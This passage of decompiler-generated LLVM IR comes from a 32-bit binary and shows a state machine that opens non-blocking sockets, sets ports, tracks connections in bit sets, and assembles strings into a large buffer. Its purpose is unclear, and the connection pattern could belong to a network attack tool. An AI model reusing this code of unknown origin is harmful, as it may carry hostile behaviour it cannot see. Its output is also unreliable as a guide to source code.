  %v1_804852d = add i32 %v0_804852d, 72
  %v2_804852d = inttoptr i32 %v1_804852d to i32*
  store i32 0, i32* %v2_804852d, align 4
  br label %dec_label_pc_80485a5

dec_label_pc_8048537:                             ; preds = %dec_label_pc_80485b6
  %v10_8048537 = icmp eq i8 %v3_80485a5, 2
  store i1 %v10_8048537, i1* %zf.global-to-local, align 1
  br i1 %v10_8048537, label %dec_label_pc_8048c9d, label %dec_label_pc_804853f

dec_label_pc_804853f:                             ; preds = %dec_label_pc_8048537
  %v10_804853f = icmp eq i8 %v3_80485a5, 4
  store i1 %v10_804853f, i1* %zf.global-to-local, align 1
  br i1 %v10_804853f, label %dec_label_pc_8048700, label %dec_label_pc_8048547

dec_label_pc_8048547:                             ; preds = %dec_label_pc_804853f
  %v10_8048547 = icmp eq i8 %v3_80485a5, 6
  store i1 %v10_8048547, i1* %zf.global-to-local, align 1
  br i1 %v10_8048547, label %dec_label_pc_80493a7, label %dec_label_pc_804854f

dec_label_pc_804854f:                             ; preds = %dec_label_pc_8048547
  %v10_804854f = icmp eq i8 %v3_80485a5, 7
  store i1 %v10_804854f, i1* %zf.global-to-local, align 1
  br i1 %v10_804854f, label %dec_label_pc_8049773, label %dec_label_pc_8048557

dec_label_pc_8048557:                             ; preds = %dec_label_pc_804854f
  %v10_8048557 = icmp eq i8 %v3_80485a5, 10
  store i1 %v10_8048557, i1* %zf.global-to-local, align 1
  br i1 %v10_8048557, label %dec_label_pc_8049829, label %dec_label_pc_8048557.dec_label_pc_804855f_crit_edge

dec_label_pc_8048557.dec_label_pc_804855f_crit_edge: ; preds = %dec_label_pc_8048557
  %v0_804855f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804855f

dec_label_pc_804855f:                             ; preds = %dec_label_pc_8048557.dec_label_pc_804855f_crit_edge, %dec_label_pc_8048c9d
  %v0_804855f = phi i32 [ %v0_804855f.pre, %dec_label_pc_8048557.dec_label_pc_804855f_crit_edge ], [ %v0_8048c9d, %dec_label_pc_8048c9d ]
  %v9_804855f = icmp eq i32 %v0_804855f, 12
  store i1 %v9_804855f, i1* %zf.global-to-local, align 1
  %v1_8048562 = add i32 %v0_80485a5, -1440
  %v2_8048562 = inttoptr i32 %v1_8048562 to i32*
  %v3_8048562 = load i32, i32* %v2_8048562, align 4
  store i32 %v3_8048562, i32* %edx.global-to-local, align 4
  store i8 0, i8* %v2_80485a5, align 1
  %v0_804856f = load i32, i32* %edx.global-to-local, align 4
  %v1_804856f = load i32, i32* @esp, align 4
  %v2_804856f = add i32 %v1_804856f, -4
  %v3_804856f = inttoptr i32 %v2_804856f to i32*
  store i32 %v0_804856f, i32* %v3_804856f, align 4
  %v1_8048570 = call i32 @function_8052bc1(i32 %stack_var_-20924.0.ph)
  store i32 %v1_8048570, i32* %eax.global-to-local, align 4
  %v0_8048575 = load i32, i32* @esi, align 4
  %v1_8048575 = add i32 %v0_8048575, -1440
  %v2_8048575 = inttoptr i32 %v1_8048575 to i32*
  store i32 -1, i32* %v2_8048575, align 4
  %v0_804857f = load i32, i32* @esp, align 4
  %v6_804857f = icmp eq i32 %v0_804857f, -16
  store i1 %v6_804857f, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048582

dec_label_pc_8048582:                             ; preds = %dec_label_pc_8049829, %dec_label_pc_8049773, %dec_label_pc_80493a7, %dec_label_pc_8048cb2, %dec_label_pc_8048c28, %dec_label_pc_8048601, %dec_label_pc_804861f, %dec_label_pc_80486e4, %dec_label_pc_804855f
  %v0_8048582 = load i32, i32* @esp, align 4
  %v1_8048582 = add i32 %v0_8048582, 100
  %v2_8048582 = inttoptr i32 %v1_8048582 to i32*
  %v3_8048582 = load i32, i32* %v2_8048582, align 4
  %v0_8048586 = load i32, i32* @ebp, align 4
  %v1_8048586 = add i32 %v0_8048586, 3140
  store i32 %v1_8048586, i32* @ebp, align 4
  %v1_804858c = add i32 %v3_8048582, 1
  store i32 %v1_804858c, i32* %eax.global-to-local, align 4
  %v0_804858d = load i32, i32* @esi, align 4
  %v1_804858d = add i32 %v0_804858d, 3140
  store i32 %v1_804858d, i32* @esi, align 4
  store i32 %v1_804858c, i32* %v2_8048582, align 4
  %v0_8048597 = load i32, i32* @esp, align 4
  %v1_8048597 = add i32 %v0_8048597, 100
  %v2_8048597 = inttoptr i32 %v1_8048597 to i32*
  %v3_8048597 = load i32, i32* %v2_8048597, align 4
  store i32 %v3_8048597, i32* @ecx, align 4
  %v1_804859b = add i32 %v0_8048597, 112
  %v2_804859b = inttoptr i32 %v1_804859b to i32*
  %v3_804859b = load i32, i32* %v2_804859b, align 4
  %v15_804859b = icmp eq i32 %v3_804859b, %v3_8048597
  store i1 %v15_804859b, i1* %zf.global-to-local, align 1
  br i1 %v15_804859b, label %dec_label_pc_8048cdd, label %dec_label_pc_80485a5

dec_label_pc_80485a5:                             ; preds = %dec_label_pc_8048582, %dec_label_pc_8048517
  %v0_80485a5 = load i32, i32* @esi, align 4
  %v1_80485a5 = add i32 %v0_80485a5, -1436
  %v2_80485a5 = inttoptr i32 %v1_80485a5 to i8*
  %v3_80485a5 = load i8, i8* %v2_80485a5, align 1
  %v4_80485a5 = zext i8 %v3_80485a5 to i32
  %v5_80485a5 = load i32, i32* %eax.global-to-local, align 4
  %v6_80485a5 = and i32 %v5_80485a5, -256
  %v7_80485a5 = or i32 %v6_80485a5, %v4_80485a5
  store i32 %v7_80485a5, i32* %eax.global-to-local, align 4
  %v0_80485ab = load i32, i32* @ebp, align 4
  %v1_80485ab = add i32 %v0_80485ab, -16
  store i32 %v1_80485ab, i32* @edi, align 4
  %v6_80485ae = icmp eq i8 %v3_80485a5, 0
  %v10_80485ae = icmp eq i8 %v3_80485a5, 1
  store i1 %v10_80485ae, i1* %zf.global-to-local, align 1
  br i1 %v10_80485ae, label %dec_label_pc_80486ee, label %dec_label_pc_80485b6

dec_label_pc_80485b6:                             ; preds = %dec_label_pc_80485a5
  store i1 %v6_80485ae, i1* %zf.global-to-local, align 1
  %v1_80485b8 = icmp eq i1 %v6_80485ae, false
  br i1 %v1_80485b8, label %dec_label_pc_8048537, label %dec_label_pc_80485be

dec_label_pc_80485be:                             ; preds = %dec_label_pc_80485b6, %dec_label_pc_8048c91
  %v0_80485be = load i32, i32* @esp, align 4
  %v1_80485be = add i32 %v0_80485be, 20868
  %v2_80485be = inttoptr i32 %v1_80485be to i32*
  store i32 0, i32* %v2_80485be, align 4
  %v0_80485c9 = load i32, i32* @esp, align 4
  %v1_80485c9 = add i32 %v0_80485c9, 20872
  %v2_80485c9 = inttoptr i32 %v1_80485c9 to i32*
  store i32 0, i32* %v2_80485c9, align 4
  %v0_80485d4 = load i32, i32* @esp, align 4
  %v1_80485d4 = add i32 %v0_80485d4, 20876
  %v2_80485d4 = inttoptr i32 %v1_80485d4 to i32*
  store i32 0, i32* %v2_80485d4, align 4
  %v0_80485df = load i32, i32* @esp, align 4
  %v1_80485df = add i32 %v0_80485df, 20880
  %v2_80485df = inttoptr i32 %v1_80485df to i32*
  store i32 0, i32* %v2_80485df, align 4
  %v0_80485ea = load i32, i32* @esi, align 4
  %v1_80485ea = add i32 %v0_80485ea, -1440
  %v2_80485ea = inttoptr i32 %v1_80485ea to i32*
  %v3_80485ea = load i32, i32* %v2_80485ea, align 4
  store i32 %v3_80485ea, i32* %eax.global-to-local, align 4
  %v10_80485f0 = icmp eq i32 %v3_80485ea, -1
  store i1 %v10_80485f0, i1* %zf.global-to-local, align 1
  %v1_8048601.pre = load i32, i32* @esp, align 4
  br i1 %v10_80485f0, label %dec_label_pc_8048601, label %dec_label_pc_80485f5

dec_label_pc_80485f5:                             ; preds = %dec_label_pc_80485be
  %v9_80485f5 = icmp eq i32 %v1_8048601.pre, 12
  store i1 %v9_80485f5, i1* %zf.global-to-local, align 1
  %v2_80485f8 = add i32 %v1_8048601.pre, -16
  %v3_80485f8 = inttoptr i32 %v2_80485f8 to i32*
  store i32 %v3_80485ea, i32* %v3_80485f8, align 4
  %v1_80485f9 = call i32 @function_8052bc1(i32 %stack_var_-20924.0.ph)
  store i32 %v1_80485f9, i32* %eax.global-to-local, align 4
  %v0_80485fe = load i32, i32* @esp, align 4
  %v1_80485fe = add i32 %v0_80485fe, 16
  %v6_80485fe = icmp eq i32 %v1_80485fe, 0
  store i1 %v6_80485fe, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048601

dec_label_pc_8048601:                             ; preds = %dec_label_pc_80485be, %dec_label_pc_80485f5
  %v1_8048601 = phi i32 [ %v1_80485fe, %dec_label_pc_80485f5 ], [ %v1_8048601.pre, %dec_label_pc_80485be ]
  %v0_8048601 = load i32, i32* @ecx, align 4
  %v2_8048601 = add i32 %v1_8048601, -4
  %v3_8048601 = inttoptr i32 %v2_8048601 to i32*
  store i32 %v0_8048601, i32* %v3_8048601, align 4
  %v1_8048602 = add i32 %v1_8048601, -8
  %v2_8048602 = inttoptr i32 %v1_8048602 to i32*
  store i32 0, i32* %v2_8048602, align 4
  %v1_8048604 = add i32 %v1_8048601, -12
  %v2_8048604 = inttoptr i32 %v1_8048604 to i32*
  store i32 1, i32* %v2_8048604, align 4
  %v1_8048606 = add i32 %v1_8048601, -16
  %v2_8048606 = inttoptr i32 %v1_8048606 to i32*
  store i32 2, i32* %v2_8048606, align 4
  %v3_8048608 = call i32 @function_80533b5(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048608, i32* %eax.global-to-local, align 4
  %v1_8048610 = load i32, i32* @esi, align 4
  %v2_8048610 = add i32 %v1_8048610, -1440
  %v3_8048610 = inttoptr i32 %v2_8048610 to i32*
  store i32 %v3_8048608, i32* %v3_8048610, align 4
  %v10_8048616 = icmp eq i32 %v3_8048608, -1
  store i1 %v10_8048616, i1* %zf.global-to-local, align 1
  br i1 %v10_8048616, label %dec_label_pc_8048582, label %dec_label_pc_804861f

dec_label_pc_804861f:                             ; preds = %dec_label_pc_8048601
  %v0_804861f = load i32, i32* @edx, align 4
  %v1_804861f = load i32, i32* @esp, align 4
  %v2_804861f = add i32 %v1_804861f, -4
  %v3_804861f = inttoptr i32 %v2_804861f to i32*
  store i32 %v0_804861f, i32* %v3_804861f, align 4
  %v1_8048620 = add i32 %v1_804861f, -8
  %v2_8048620 = inttoptr i32 %v1_8048620 to i32*
  store i32 0, i32* %v2_8048620, align 4
  %v1_8048622 = add i32 %v1_804861f, -12
  %v2_8048622 = inttoptr i32 %v1_8048622 to i32*
  store i32 3, i32* %v2_8048622, align 4
  %v2_8048624 = add i32 %v1_804861f, -16
  %v3_8048624 = inttoptr i32 %v2_8048624 to i32*
  store i32 %v3_8048608, i32* %v3_8048624, align 4
  %v3_8048625 = call i32 @function_8052afd(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804862a = load i32, i32* @esp, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v12_804862d = or i32 %v3_8048625, 2048
  store i32 %v12_804862d, i32* %eax.global-to-local, align 4
  %v2_8048630 = add i32 %v0_804862a, 8
  %v3_8048630 = inttoptr i32 %v2_8048630 to i32*
  store i32 %v12_804862d, i32* %v3_8048630, align 4
  %v1_8048631 = add i32 %v0_804862a, 4
  %v2_8048631 = inttoptr i32 %v1_8048631 to i32*
  store i32 4, i32* %v2_8048631, align 4
  %v0_8048633 = load i32, i32* @esi, align 4
  %v1_8048633 = add i32 %v0_8048633, -1440
  %v2_8048633 = inttoptr i32 %v1_8048633 to i32*
  %v3_8048633 = load i32, i32* %v2_8048633, align 4
  store i32 %v3_8048633, i32* %eax.global-to-local, align 4
  %v3_8048639 = inttoptr i32 %v0_804862a to i32*
  store i32 %v3_8048633, i32* %v3_8048639, align 4
  %v3_804863a = call i32 @function_8052afd(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804863f = load i32, i32* @esp, align 4
  %v1_804863f = add i32 %v0_804863f, 20916
  store i32 %v1_804863f, i32* %eax.global-to-local, align 4
  %v2_8048646 = inttoptr i32 %v1_804863f to i32*
  store i32 65535, i32* %v2_8048646, align 4
  %v0_8048651 = load i32, i32* @esp, align 4
  %v1_8048651 = inttoptr i32 %v0_8048651 to i32*
  store i32 4, i32* %v1_8048651, align 4
  %v0_8048658 = load i32, i32* %eax.global-to-local, align 4
  %v1_8048658 = load i32, i32* @esp, align 4
  %v2_8048658 = add i32 %v1_8048658, -4
  %v3_8048658 = inttoptr i32 %v2_8048658 to i32*
  store i32 %v0_8048658, i32* %v3_8048658, align 4
  %v1_8048659 = add i32 %v1_8048658, -8
  %v2_8048659 = inttoptr i32 %v1_8048659 to i32*
  store i32 8, i32* %v2_8048659, align 4
  %v1_804865b = add i32 %v1_8048658, -12
  %v2_804865b = inttoptr i32 %v1_804865b to i32*
  store i32 0, i32* %v2_804865b, align 4
  %v0_804865d = load i32, i32* @esi, align 4
  %v1_804865d = add i32 %v0_804865d, -1440
  %v2_804865d = inttoptr i32 %v1_804865d to i32*
  %v3_804865d = load i32, i32* %v2_804865d, align 4
  store i32 %v3_804865d, i32* %eax.global-to-local, align 4
  %v2_8048663 = add i32 %v1_8048658, -16
  %v3_8048663 = inttoptr i32 %v2_8048663 to i32*
  store i32 %v3_804865d, i32* %v3_8048663, align 4
  %v5_8048664 = call i32 @function_805337a(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8048664, i32* %eax.global-to-local, align 4
  %v0_8048669 = load i32, i32* @esi, align 4
  %v1_8048669 = add i32 %v0_8048669, -1424
  %v2_8048669 = inttoptr i32 %v1_8048669 to i32*
  %v3_8048669 = load i32, i32* %v2_8048669, align 4
  store i32 %v3_8048669, i32* %eax.global-to-local, align 4
  %v0_804866f = load i32, i32* @esp, align 4
  %v1_804866f = add i32 %v0_804866f, 112
  %v2_804866f = inttoptr i32 %v1_804866f to i32*
  %v3_804866f = load i32, i32* %v2_804866f, align 4
  store i32 %v3_804866f, i32* %edx.global-to-local, align 4
  %v2_8048673 = add i32 %v0_804866f, 20904
  %v3_8048673 = inttoptr i32 %v2_8048673 to i32*
  store i32 %v3_8048669, i32* %v3_8048673, align 4
  %v0_804867a = load i32, i32* @esp, align 4
  %v1_804867a = add i32 %v0_804867a, 20900
  %v2_804867a = inttoptr i32 %v1_804867a to i16*
  store i16 2, i16* %v2_804867a, align 2
  %v0_8048684 = load i32, i32* @esp, align 4
  %v1_8048684 = add i32 %v0_8048684, 102
  %v2_8048684 = inttoptr i32 %v1_8048684 to i16*
  %v3_8048684 = load i16, i16* %v2_8048684, align 2
  %v5_8048684 = load i32, i32* %eax.global-to-local, align 4
  %v6_8048684 = and i32 %v5_8048684, -65536
  %v0_8048689 = load i32, i32* %edx.global-to-local, align 4
  %v1_8048689 = load i32, i32* @esi, align 4
  %v2_8048689 = add i32 %v1_8048689, -1432
  %v3_8048689 = inttoptr i32 %v2_8048689 to i32*
  store i32 %v0_8048689, i32* %v3_8048689, align 4
  %v2_804868f = call i16 @llvm.bswap.i16(i16 %v3_8048684)
  %v3_804868f = zext i16 %v2_804868f to i32
  %v6_804868f = or i32 %v3_804868f, %v6_8048684
  store i32 %v6_804868f, i32* %eax.global-to-local, align 4
  %v2_8048693 = load i32, i32* @esp, align 4
  %v3_8048693 = add i32 %v2_8048693, 20902
  %v4_8048693 = inttoptr i32 %v3_8048693 to i16*
  store i16 %v2_804868f, i16* %v4_8048693, align 2
  %v0_804869b = load i32, i32* @esp, align 4
  %v9_804869b = icmp eq i32 %v0_804869b, -28
  store i1 %v9_804869b, i1* %zf.global-to-local, align 1
  %v0_804869e = load i32, i32* @esi, align 4
  %v1_804869e = add i32 %v0_804869e, -1436
  %v2_804869e = inttoptr i32 %v1_804869e to i8*
  store i8 2, i8* %v2_804869e, align 1
  %v0_80486a5 = load i32, i32* @esp, align 4
  %v1_80486a5 = add i32 %v0_80486a5, -4
  %v2_80486a5 = inttoptr i32 %v1_80486a5 to i32*
  store i32 16, i32* %v2_80486a5, align 4
  %v1_80486a7 = add i32 %v0_80486a5, 20872
  store i32 %v1_80486a7, i32* %ecx.global-to-local, align 4
  %v2_80486ae = add i32 %v0_80486a5, -8
  %v3_80486ae = inttoptr i32 %v2_80486ae to i32*
  store i32 %v1_80486a7, i32* %v3_80486ae, align 4
  %v0_80486af = load i32, i32* @esi, align 4
  %v1_80486af = add i32 %v0_80486af, -1440
  %v2_80486af = inttoptr i32 %v1_80486af to i32*
  %v3_80486af = load i32, i32* %v2_80486af, align 4
  store i32 %v3_80486af, i32* @edi, align 4
  %v2_80486b5 = add i32 %v0_80486a5, -12
  %v3_80486b5 = inttoptr i32 %v2_80486b5 to i32*
  store i32 %v3_80486af, i32* %v3_80486b5, align 4
  %v3_80486b6 = call i32 @function_80531da(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80486b6, i32* %eax.global-to-local, align 4
  %v0_80486bb = load i32, i32* @esi, align 4
  %v1_80486bb = add i32 %v0_80486bb, -1440
  %v2_80486bb = inttoptr i32 %v1_80486bb to i32*
  %v3_80486bb = load i32, i32* %v2_80486bb, align 4
  %v1_80486c3 = urem i32 %v3_80486bb, 32
  store i32 %v1_80486c3, i32* %eax.global-to-local, align 4
  %v2_80486c6 = udiv i32 %v3_80486bb, 32
  store i32 %v2_80486c6, i32* %edx.global-to-local, align 4
  %v0_80486c9 = load i32, i32* @esp, align 4
  %v2_80486c9 = mul nuw nsw i32 %v2_80486c6, 4
  %v3_80486c9 = add nuw nsw i32 %v2_80486c9, 20628
  %v4_80486c9 = add i32 %v3_80486c9, %v0_80486c9
  %v5_80486c9 = inttoptr i32 %v4_80486c9 to i32*
  %v6_80486c9 = load i32, i32* %v5_80486c9, align 4
  %v9_80486c9 = shl i32 1, %v1_80486c3
  %v12_80486c9 = or i32 %v6_80486c9, %v9_80486c9
  store i32 %v12_80486c9, i32* %v5_80486c9, align 4
  %v0_80486d1 = load i32, i32* @esp, align 4
  %v1_80486d1 = add i32 %v0_80486d1, 16
  %v0_80486d4 = load i32, i32* @esi, align 4
  %v1_80486d4 = add i32 %v0_80486d4, -1440
  %v2_80486d4 = inttoptr i32 %v1_80486d4 to i32*
  %v3_80486d4 = load i32, i32* %v2_80486d4, align 4
  store i32 %v3_80486d4, i32* %eax.global-to-local, align 4
  %v1_80486da = add i32 %v0_80486d1, 88
  %v2_80486da = inttoptr i32 %v1_80486da to i32*
  %v3_80486da = load i32, i32* %v2_80486da, align 4
  %v5_80486da = sub i32 %v3_80486da, %v3_80486d4
  %v11_80486da = xor i32 %v3_80486da, %v3_80486d4
  %v12_80486da = xor i32 %v5_80486da, %v3_80486da
  %v13_80486da = and i32 %v12_80486da, %v11_80486da
  %v14_80486da = icmp slt i32 %v13_80486da, 0
  %v15_80486da = icmp eq i32 %v5_80486da, 0
  store i1 %v15_80486da, i1* %zf.global-to-local, align 1
  %v16_80486da = icmp slt i32 %v5_80486da, 0
  %v2_80486de = icmp eq i1 %v16_80486da, %v14_80486da
  br i1 %v2_80486de, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_80486e4:                             ; preds = %dec_label_pc_8049829, %dec_label_pc_8049773, %dec_label_pc_80493a7, %dec_label_pc_8048cb2, %dec_label_pc_8048c28, %dec_label_pc_804861f
  %v1_80486e5 = phi i32 [ %v1_8049845, %dec_label_pc_8049829 ], [ %v1_804978f, %dec_label_pc_8049773 ], [ %v1_80493c3, %dec_label_pc_80493a7 ], [ %v0_8048cce, %dec_label_pc_8048cb2 ], [ %v1_8048c79, %dec_label_pc_8048c28 ], [ %v1_80486d1, %dec_label_pc_804861f ]
  %v0_80486e4 = phi i32 [ %v3_804983f, %dec_label_pc_8049829 ], [ %v3_8049789, %dec_label_pc_8049773 ], [ %v3_80493bd, %dec_label_pc_80493a7 ], [ %v3_8048cc8, %dec_label_pc_8048cb2 ], [ %v3_8048c7c, %dec_label_pc_8048c28 ], [ %v3_80486d4, %dec_label_pc_804861f ]
  %v1_80486e4 = add i32 %v0_80486e4, 1
  %v8_80486e4 = icmp eq i32 %v1_80486e4, 0
  store i1 %v8_80486e4, i1* %zf.global-to-local, align 1
  store i32 %v1_80486e4, i32* %eax.global-to-local, align 4
  %v2_80486e5 = add i32 %v1_80486e5, 72
  %v3_80486e5 = inttoptr i32 %v2_80486e5 to i32*
  store i32 %v1_80486e4, i32* %v3_80486e5, align 4
  br label %dec_label_pc_8048582

dec_label_pc_80486ee:                             ; preds = %dec_label_pc_80485a5
  %v1_80486ee = add i32 %v0_80485a5, 16
  %v2_80486ee = inttoptr i32 %v1_80486ee to i32*
  %v3_80486ee = load i32, i32* %v2_80486ee, align 4
  store i32 %v3_80486ee, i32* @ebx, align 4
  %v1_80486f1 = icmp eq i32 %v3_80486ee, 0
  store i1 %v1_80486f1, i1* %zf.global-to-local, align 1
  br i1 %v1_80486f1, label %dec_label_pc_8048c91, label %dec_label_pc_80486f9

dec_label_pc_80486f9:                             ; preds = %dec_label_pc_80486ee
  store i8 4, i8* %v2_80485a5, align 1
  %v0_8048700.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8048700

dec_label_pc_8048700:                             ; preds = %dec_label_pc_804853f, %dec_label_pc_80486f9
  %v0_8048700 = phi i32 [ %v0_80485a5, %dec_label_pc_804853f ], [ %v0_8048700.pre, %dec_label_pc_80486f9 ]
  %v1_8048700 = add i32 %v0_8048700, 24
  %v2_8048700 = inttoptr i32 %v1_8048700 to i32*
  store i32 -1, i32* %v2_8048700, align 4
  %v0_8048707 = load i32, i32* @esi, align 4
  %v1_8048707 = add i32 %v0_8048707, 12
  %v2_8048707 = inttoptr i32 %v1_8048707 to i32*
  store i32 0, i32* %v2_8048707, align 4
  %v0_804870e = load i32, i32* @edi, align 4
  %v1_804870e = add i32 %v0_804870e, 2116
  store i32 %v1_804870e, i32* @eax, align 4
  %v0_8048714 = load i32, i32* @ecx, align 4
  %v1_8048714 = load i32, i32* @esp, align 4
  %v2_8048714 = add i32 %v1_8048714, -4
  %v3_8048714 = inttoptr i32 %v2_8048714 to i32*
  store i32 %v0_8048714, i32* %v3_8048714, align 4
  %v0_8048715 = load i32, i32* @ecx, align 4
  %v2_8048715 = add i32 %v1_8048714, -8
  %v3_8048715 = inttoptr i32 %v2_8048715 to i32*
  store i32 %v0_8048715, i32* %v3_8048715, align 4
  %v1_8048716 = add i32 %v1_8048714, -12
  %v2_8048716 = inttoptr i32 %v1_8048716 to i32*
  store i32 1024, i32* %v2_8048716, align 4
  %v0_804871b = load i32, i32* @eax, align 4
  %v2_804871b = add i32 %v1_8048714, -16
  %v3_804871b = inttoptr i32 %v2_804871b to i32*
  store i32 %v0_804871b, i32* %v3_804871b, align 4
  %v2_804871c = call i32 @function_80526b0(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804871c, i32* %eax.global-to-local, align 4
  %v0_8048721 = load i32, i32* @esi, align 4
  %v1_8048721 = add i32 %v0_8048721, 672
  %v2_8048721 = inttoptr i32 %v1_8048721 to i32*
  store i32 0, i32* %v2_8048721, align 4
  %v0_804872b = load i32, i32* @esp, align 4
  %v1_804872b = inttoptr i32 %v0_804872b to i32*
  %v2_804872b = load i32, i32* %v1_804872b, align 4
  store i32 %v2_804872b, i32* %eax.global-to-local, align 4
  %v3_804872b = add i32 %v0_804872b, 4
  %v1_804872c = inttoptr i32 %v3_804872b to i32*
  %v2_804872c = load i32, i32* %v1_804872c, align 4
  store i32 %v2_804872c, i32* %edx.global-to-local, align 4
  store i32 10240, i32* %v1_804872c, align 4
  %v1_8048732 = add i32 %v0_804872b, 10388
  store i32 %v1_8048732, i32* @eax, align 4
  store i32 %v1_8048732, i32* %v1_804872b, align 4
  %v2_804873a = call i32 @function_80526b0(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804873a, i32* %eax.global-to-local, align 4
  %v0_804873f = load i32, i32* @edi, align 4
  %v1_804873f = add i32 %v0_804873f, 1431
  store i32 %v1_804873f, i32* %edx.global-to-local, align 4
  %v1_8048745 = load i32, i32* @esp, align 4
  %v2_8048745 = add i32 %v1_8048745, 112
  %v3_8048745 = inttoptr i32 %v2_8048745 to i32*
  store i32 %v1_804873f, i32* %v3_8048745, align 4
  %v0_8048749 = load i32, i32* @esp, align 4
  %v1_8048749 = inttoptr i32 %v0_8048749 to i32*
  %v2_8048749 = load i32, i32* %v1_8048749, align 4
  store i32 %v2_8048749, i32* %eax.global-to-local, align 4
  %v1_804874a = add i32 %v0_8048749, 10388
  store i32 %v1_804874a, i32* %ecx.global-to-local, align 4
  store i32 %v1_804874a, i32* %v1_8048749, align 4
  %v2_8048752 = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8048752, i32* %eax.global-to-local, align 4
  %v0_8048757 = load i32, i32* @esp, align 4
  %v1_8048757 = inttoptr i32 %v0_8048757 to i32*
  %v2_8048757 = load i32, i32* %v1_8048757, align 4
  store i32 %v2_8048757, i32* %ecx.global-to-local, align 4
  %v3_8048757 = add i32 %v0_8048757, 4
  %v1_8048758 = inttoptr i32 %v3_8048757 to i32*
  %v2_8048758 = load i32, i32* %v1_8048758, align 4
  store i32 %v2_8048758, i32* @ebx, align 4
  %v1_8048759 = add i32 %v0_8048757, 112
  %v2_8048759 = inttoptr i32 %v1_8048759 to i32*
  %v3_8048759 = load i32, i32* %v2_8048759, align 4
  store i32 %v3_8048759, i32* %v1_8048758, align 4
  %v1_804875e = add i32 %v0_8048757, 10388
  store i32 %v1_804875e, i32* %edx.global-to-local, align 4
  %v2_8048765 = add i32 %v1_804875e, %v2_8048752
  store i32 %v2_8048765, i32* %eax.global-to-local, align 4
  store i32 %v2_8048765, i32* %v1_8048757, align 4
  %v3_8048769 = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048769, i32* %eax.global-to-local, align 4
  %v0_804876e = load i32, i32* @esp, align 4
  %v1_804876e = inttoptr i32 %v0_804876e to i32*
  %v2_804876e = load i32, i32* %v1_804876e, align 4
  store i32 %v2_804876e, i32* @ebx, align 4
  %v1_804876f = add i32 %v0_804876e, 10388
  store i32 %v1_804876f, i32* %ecx.global-to-local, align 4
  store i32 %v1_804876f, i32* %v1_804876e, align 4
  %v2_8048777 = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8048777, i32* %eax.global-to-local, align 4
  %v0_804877c = load i32, i32* @esp, align 4
  %v1_804877c = inttoptr i32 %v0_804877c to i32*
  %v2_804877c = load i32, i32* %v1_804877c, align 4
  store i32 %v2_804877c, i32* %edx.global-to-local, align 4
  %v3_804877c = add i32 %v0_804877c, 4
  %v1_804877d = inttoptr i32 %v3_804877c to i32*
  %v2_804877d = load i32, i32* %v1_804877d, align 4
  store i32 %v2_804877d, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80554df.7 to i32), i32* %v1_804877d, align 4
  %v1_8048783 = add i32 %v0_804877c, 10388
  store i32 %v1_8048783, i32* %edx.global-to-local, align 4
  %v2_804878a = add i32 %v1_8048783, %v2_8048777
  store i32 %v2_804878a, i32* %eax.global-to-local, align 4
  store i32 %v2_804878a, i32* %v1_804877c, align 4
  %v3_804878e = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804878e, i32* %eax.global-to-local, align 4
  %v0_8048793 = load i32, i32* @esp, align 4
  %v1_8048793 = inttoptr i32 %v0_8048793 to i32*
  %v2_8048793 = load i32, i32* %v1_8048793, align 4
  store i32 %v2_8048793, i32* @ebx, align 4
  %v1_8048794 = add i32 %v0_8048793, 10388
  store i32 %v1_8048794, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048794, i32* %v1_8048793, align 4
  %v2_804879c = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_804879c, i32* %eax.global-to-local, align 4
  %v0_80487a1 = load i32, i32* @esp, align 4
  %v1_80487a1 = inttoptr i32 %v0_80487a1 to i32*
  %v3_80487a1 = add i32 %v0_80487a1, 4
  %v0_80487a2 = load i32, i32* @edi, align 4
  %v1_80487a2 = add i32 %v0_80487a2, 532
  store i32 %v1_80487a2, i32* %edx.global-to-local, align 4
  %v1_80487a8 = inttoptr i32 %v3_80487a1 to i32*
  %v2_80487a8 = load i32, i32* %v1_80487a8, align 4
  store i32 %v2_80487a8, i32* %ecx.global-to-local, align 4
  store i32 %v1_80487a2, i32* %v1_80487a8, align 4
  %v1_80487aa = add i32 %v0_80487a1, 10388
  store i32 %v1_80487aa, i32* %edx.global-to-local, align 4
  %v2_80487b1 = add i32 %v1_80487aa, %v2_804879c
  store i32 %v2_80487b1, i32* %eax.global-to-local, align 4
  store i32 %v2_80487b1, i32* %v1_80487a1, align 4
  %v3_80487b5 = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80487b5, i32* %eax.global-to-local, align 4
  %v0_80487ba = load i32, i32* @esp, align 4
  %v1_80487ba = inttoptr i32 %v0_80487ba to i32*
  %v2_80487ba = load i32, i32* %v1_80487ba, align 4
  store i32 %v2_80487ba, i32* @ebx, align 4
  %v1_80487bb = add i32 %v0_80487ba, 10388
  store i32 %v1_80487bb, i32* %ecx.global-to-local, align 4
  store i32 %v1_80487bb, i32* %v1_80487ba, align 4
